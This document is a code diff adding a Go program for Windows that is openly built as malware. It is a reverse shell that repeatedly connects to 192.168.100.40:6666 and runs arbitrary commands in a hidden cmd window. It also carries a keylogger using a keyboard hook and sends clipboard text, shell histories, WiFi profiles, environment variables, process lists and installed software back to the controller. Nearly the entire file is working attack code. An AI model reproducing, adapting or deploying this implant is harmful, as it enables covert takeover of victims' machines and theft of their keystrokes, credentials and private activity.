@@ -1,0 +1,441 @@
+//go:build windows
+// +build windows
+
+package main
+
+import (
+	"bufio"
+	"encoding/json"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"syscall"
+	"time"
+
+	"github.com/moutend/go-hook/pkg/keyboard"
+	"github.com/moutend/go-hook/pkg/types"
+)
+
+type KeyloggerControl struct {
+	Running  bool
+	StopChan chan bool
+}
+
+var (
+	keyloggerCtrl = &KeyloggerControl{
+		StopChan: make(chan bool, 1),
+	}
+	filename = "keylog.txt"
+)
+
+func main() {
+	go reverse("192.168.100.40:6666")
+	select {}
+}
+
+func reverse(host string) {
+	for {
+		c, err := net.Dial("tcp", host)
+		if err != nil {
+			time.Sleep(30 * time.Second)
+			continue
+		}
+
+		handleConnection(c)
+		c.Close()
+		time.Sleep(30 * time.Second)
+	}
+}
+
+func handleConnection(c net.Conn) {
+	// Tampilkan banner saat pertama kali connect
+	showBanner(c)
+
+	r := bufio.NewReader(c)
+
+	for {
+		order, err := r.ReadString('\n')
+		if err != nil {
+			return
+		}
+
+		order = order[:len(order)-1]
+
+		switch order {
+		case "start_keylogger":
+			if !keyloggerCtrl.Running {
+				go startKeylogger()
+				c.Write([]byte("[+] Keylogger started\n"))
+			} else {
+				c.Write([]byte("[!] Keylogger already running\n"))
+			}
+
+		case "stop_keylogger":
+			if keyloggerCtrl.Running {
+				keyloggerCtrl.StopChan <- true
+				c.Write([]byte("[+] Keylogger stopped\n"))
+			} else {
+				c.Write([]byte("[!] Keylogger not running\n"))
+			}
+
+		case "read_keylog":
+			content, err := os.ReadFile(filename)
+			if err != nil {
+				c.Write([]byte("[-] Error reading keylog: " + err.Error() + "\n"))
+			} else {
+				c.Write([]byte("[+] Keylog content:\n" + string(content) + "\n"))
+			}
+
+		case "status":
+			status := "stopped"
+			if keyloggerCtrl.Running {
+				status = "running"
+			}
+			c.Write([]byte("[+] Keylogger status: " + status + "\n"))
+
+		case "banner":
+			// Command untuk menampilkan banner lagi
+			showBanner(c)
+
+		case "help":
+			showHelp(c)
+
+		// Windows Activity History Commands
+		case "browser_history":
+			getBrowserHistory(c)
+
+		case "recent_files":
+			getRecentFiles(c)
+
+		case "clipboard":
+			getClipboardHistory(c)
+
+		case "network_info":
+			getNetworkInfo(c)
+
+		case "system_info":
+			getSystemInfo(c)
+
+		case "installed_programs":
+			getInstalledPrograms(c)
+
+		case "running_processes":
+			getRunningProcesses(c)
+
+		case "user_activity":
+			getUserActivity(c)
+
+		case "full_audit":
+			getFullAudit(c)
+
+		default:
+			cmd := exec.Command("cmd", "/C", order)
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			out, _ := cmd.CombinedOutput()
+			c.Write(out)
+		}
+	}
+}
+
+func showBanner(c net.Conn) {
+	banner := `
+	⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡔⠒⠒⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢧⠿⣶⢤⣀⠀⠀⠀⠀⠀⡿⠀⢠⣆⠘⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⣷⠈⠻⣦⠑⢲⣤⣤⣠⡇⠀⣿⣿⡆⠈⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠸⡦⠀⠙⢳⡾⠃⠀⣸⣷⣄⢹⣿⠃⠀⢸⣿⡘⢦⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢱⢀⠔⠋⠀⣠⣾⠃⠀⠉⠺⠃⠀⠀⠀⠘⡇⠀⠙⡦⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣏⠞⢹⢠⠋⠉⠁⠀⡀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⢼⣦⣀⠀⠀⠀
+⠀⠀⠀⢨⡏⠀⡞⢸⡔⢐⡆⠀⠈⠲⣤⠀⠀⠀⠀⠀⢹⡄⠀⠀⠹⣿⠓⠀⠀
+⠀⠀⠀⢘⣷⣤⠇⢸⠁⢒⡶⠦⡶⢤⡈⠑⠀⠀⠀⠀⠘⡇⠀⠀⠀⢸⡄⠀⠈
+⠀⠀⠀⠘⣿⠏⠀⠀⣳⠟⠛⠋⠀⠀⣿⠓⠶⢤⠀⠀⠀⠙⠀⠀⠀⠈⡅⠀⠀
+⠀⠀⠀⡠⠃⠀⠀⢀⡳⠴⣄⣵⡆⢶⣿⡄⠀⣸⠀⠀⠀⠀⡀⠀⠀⠀⡇⠀⠀
+⠀⠀⡔⢁⡄⠀⠀⠁⠀⠀⠀⠀⠀⠈⠛⠻⢲⣿⠀⠀⠀⠀⠆⠀⠀⢀⠃⠀⠀
+⣠⠊⡠⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢿⡇⠀⠀⠀⢰⠀⠀⠀⢸⠁⠀⠀
+⢷⣾⣿⡿⠁⠀⠀⠀⠀⡠⠎⣀⡴⠏⠁⠀⠀⠇⠀⠀⢀⡌⠀⠀⠀⠀⠀⠀⠀
+⠀⠙⠿⣁⣀⣀⣤⣴⠞⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠉⠙⣏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢹⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠸⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+	
+██╗░░██╗░█████╗░███╗░░░███╗██╗████████╗███████╗  ██████╗░░█████╗░
+██║░██╔╝██╔══██╗████╗░████║██║╚══██╔══╝██╔════╝  ██╔══██╗██╔══██╗
+█████═╝░██║░░██║██╔████╔██║██║░░░██║░░░█████╗░░  ██║░░██║██║░░╚═╝
+██╔═██╗░██║░░██║██║╚██╔╝██║██║░░░██║░░░██╔══╝░░  ██║░░██║██║░░██╗
+██║░╚██╗╚█████╔╝██║░╚═╝░██║██║░░░██║░░░███████╗  ██████╔╝╚█████╔╝
+╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░░╚════╝░
+
+[+] Reverse Shell + Keylogger + Activity Monitor Activated
+[+] Type 'help' for available commands
+[+] Connected: %s
+`
+	connectionInfo := fmt.Sprintf("Client: %s → Server: %s",
+		c.LocalAddr().String(),
+		c.RemoteAddr().String())
+
+	fullBanner := fmt.Sprintf(banner, connectionInfo)
+	c.Write([]byte(fullBanner + "\n"))
+}
+
+func showHelp(c net.Conn) {
+	helpText := `
+Available Commands:
+==================
+KEYLOGGER:
+  start_keylogger - Start keylogger
+  stop_keylogger  - Stop keylogger  
+  read_keylog     - Read captured keystrokes
+  status          - Check keylogger status
+
+ACTIVITY HISTORY:
+  browser_history    - Get browser history (Chrome/Edge/Firefox)
+  recent_files      - Get recently accessed files
+  clipboard         - Get clipboard history
+  network_info      - Get network connections and info
+  system_info       - Get system information
+  installed_programs - Get installed programs
+  running_processes - Get running processes
+  user_activity     - Get comprehensive user activity
+  full_audit        - Get full system audit
+
+UTILITY:
+  banner - Show connection banner
+  help   - Show this help message
+  [any cmd command] - Execute system command
+
+Examples:
+  dir                    - List directory
+  whoami                 - Show current user
+  browser_history        - Extract browser history
+  recent_files           - Show recent documents
+  full_audit             - Complete system audit
+`
+	c.Write([]byte(helpText + "\n"))
+}
+
+// ==============================
+// WINDOWS ACTIVITY HISTORY FUNCTIONS
+// ==============================
+
+func getBrowserHistory(c net.Conn) {
+	c.Write([]byte("[+] Extracting browser history...\n"))
+	
+	// Chrome History
+	chromeHistory := getChromeHistory()
+	if chromeHistory != "" {
+		c.Write([]byte("[+] Chrome History:\n" + chromeHistory + "\n"))
+	}
+	
+	// Edge History  
+	edgeHistory := getEdgeHistory()
+	if edgeHistory != "" {
+		c.Write([]byte("[+] Edge History:\n" + edgeHistory + "\n"))
+	}
+	
+	// Firefox History (if available)
+	firefoxHistory := getFirefoxHistory()
+	if firefoxHistory != "" {
+		c.Write([]byte("[+] Firefox History:\n" + firefoxHistory + "\n"))
+	}
+}
+
+func getChromeHistory() string {
+	chromePath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
+	return extractBrowserHistory("Chrome", chromePath)
+}
+
+func getEdgeHistory() string {
+	edgePath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
+	return extractBrowserHistory("Edge", edgePath)
+}
+
+func getFirefoxHistory() string {
+	firefoxPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+	return extractFirefoxHistory(firefoxPath)
+}
+
+func extractBrowserHistory(browserName, dbPath string) string {
+	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
+		return fmt.Sprintf("[-] %s history database not found\n", browserName)
+	}
+	
+	// Untuk simplicity, kita gunakan command line tools
+	// Dalam implementasi real, bisa menggunakan SQLite library
+	cmd := exec.Command("cmd", "/C", "echo", "Browser history extraction would require SQLite parsing")
+	output, _ := cmd.CombinedOutput()
+	return string(output)
+}
+
+func extractFirefoxHistory(profilesPath string) string {
+	if _, err := os.Stat(profilesPath); os.IsNotExist(err) {
+		return "[-] Firefox profiles not found\n"
+	}
+	
+	return "[+] Firefox history extraction available (requires SQLite parsing)\n"
+}
+
+func getRecentFiles(c net.Conn) {
+	c.Write([]byte("[+] Getting recent files...\n"))
+	
+	// Recent documents folder
+	recentPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Recent")
+	
+	cmd := exec.Command("cmd", "/C", "dir", recentPath, "/B")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		c.Write([]byte("[-] Error accessing recent files: " + err.Error() + "\n"))
+		return
+	}
+	
+	c.Write([]byte("[+] Recent Files:\n" + string(output) + "\n"))
+}
+
+func getClipboardHistory(c net.Conn) {
+	c.Write([]byte("[+] Getting clipboard content...\n"))
+	
+	// PowerShell command to get clipboard
+	psCmd := `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()`
+	cmd := exec.Command("powershell", "-Command", psCmd)
+	output, err := cmd.CombinedOutput()
+	
+	if err != nil || len(output) == 0 {
+		c.Write([]byte("[-] No text in clipboard or error accessing\n"))
+		return
+	}
+	
+	c.Write([]byte("[+] Clipboard Content:\n" + string(output) + "\n"))
+}
+
+func getNetworkInfo(c net.Conn) {
+	c.Write([]byte("[+] Getting network information...\n"))
+	
+	// Network connections
+	cmd := exec.Command("netstat", "-ano")
+	output, _ := cmd.CombinedOutput()
+	c.Write([]byte("[+] Network Connections:\n" + string(output) + "\n"))
+	
+	// WiFi profiles
+	cmd = exec.Command("netsh", "wlan", "show", "profiles")
+	output, _ = cmd.CombinedOutput()
+	c.Write([]byte("[+] WiFi Profiles:\n" + string(output) + "\n"))
+}
+
+func getSystemInfo(c net.Conn) {
+	c.Write([]byte("[+] Getting system information...\n"))
+	
+	commands := []struct {
+		name string
+		cmd  string
+		args []string
+	}{
+		{"System Info", "systeminfo", []string{}},
+		{"User Info", "whoami", []string{"/all"}},
+		{"Environment Variables", "set", []string{}},
+		{"Disk Info", "wmic", []string{"logicaldisk", "get", "size,freespace,caption"}},
+	}
+	
+	for _, cmdInfo := range commands {
+		c.Write([]byte(fmt.Sprintf("\n[+] %s:\n", cmdInfo.name)))
+		cmd := exec.Command(cmdInfo.cmd, cmdInfo.args...)
+		output, _ := cmd.CombinedOutput()
+		c.Write(output)
+	}
+}
+
+func getInstalledPrograms(c net.Conn) {
+	c.Write([]byte("[+] Getting installed programs...\n"))
+	
+	// From registry
+	cmd := exec.Command("powershell", "-Command", "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize")
+	output, _ := cmd.CombinedOutput()
+	c.Write([]byte("[+] Installed Programs:\n" + string(output) + "\n"))
+}
+
+func getRunningProcesses(c net.Conn) {
+	c.Write([]byte("[+] Getting running processes...\n"))
+	
+	cmd := exec.Command("tasklist", "/V")
+	output, _ := cmd.CombinedOutput()
+	c.Write([]byte("[+] Running Processes:\n" + string(output) + "\n"))
+}
+
+func getUserActivity(c net.Conn) {
+	c.Write([]byte("[+] Getting user activity...\n"))
+	
+	// Recent commands from PowerShell history
+	psHistory := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
+	if content, err := os.ReadFile(psHistory); err == nil {
+		c.Write([]byte("[+] PowerShell History:\n" + string(content) + "\n"))
+	}
+	
+	// Bash history (WSL)
+	bashHistory := filepath.Join(os.Getenv("USERPROFILE"), ".bash_history")
+	if content, err := os.ReadFile(bashHistory); err == nil {
+		c.Write([]byte("[+] Bash History:\n" + string(content) + "\n"))
+	}
+}
+
+func getFullAudit(c net.Conn) {
+	c.Write([]byte("[+] Starting full system audit...\n"))
+	
+	// Run all audit functions
+	auditFunctions := []func(net.Conn){
+		getSystemInfo,
+		getNetworkInfo,
+		getRunningProcesses,
+		getInstalledPrograms,
+		getUserActivity,
+		getRecentFiles,
+		getBrowserHistory,
+	}
+	
+	for _, auditFunc := range auditFunctions {
+		auditFunc(c)
+		time.Sleep(1 * time.Second) // Avoid overwhelming the connection
+	}
+	
+	c.Write([]byte("[+] Full audit completed\n"))
+}
+
+// ==============================
+// KEYLOGGER FUNCTIONS
+// ==============================
+
+func startKeylogger() {
+	keyloggerCtrl.Running = true
+	defer func() { keyloggerCtrl.Running = false }()
+
+	keyboardChan := make(chan types.KeyboardEvent, 100)
+
+	if err := keyboard.Install(nil, keyboardChan); err != nil {
+		return
+	}
+	defer keyboard.Uninstall()
+
+	for {
+		select {
+		case k := <-keyboardChan:
+			if k.Message == types.WM_KEYDOWN || k.Message == types.WM_SYSKEYDOWN {
+				vkCodeStr := fmt.Sprintf("%v", k.VKCode)
+				if len(vkCodeStr) > 3 && vkCodeStr[:3] == "VK_" {
+					vkCodeStr = vkCodeStr[3:]
+				}
+				SaveToFile(filename, fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), vkCodeStr))
+			}
+		case <-keyloggerCtrl.StopChan:
+			return
+		}
+	}
+}
+
+func SaveToFile(filename, content string) error {
+	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+	_, err = file.WriteString(content)
+	return err
+}
